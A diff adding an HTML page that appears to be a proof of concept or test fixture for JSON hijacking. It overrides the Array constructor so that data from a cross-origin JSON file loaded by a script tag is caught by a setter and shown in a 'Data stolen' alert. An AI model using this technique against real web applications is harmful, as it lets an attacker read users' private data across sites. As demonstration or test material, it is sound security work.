@@ -1,0 +1,17 @@
+<html>
+<head>
+<script type="text/javascript">
+function Array() {
+  var obj = this;
+  var ind = 0;
+  var getNext = function(x) {
+    obj[ind++].setter = getNext;
+    if (x) alert("Data stolen from array: " + x.toString());
+  };
+  this[ind++].setter = getNext;
+}
+</script>
+<script src="../data/vuln-array.json" type="text/javascript"></script>
+</head>
+<body></body>
+</html>
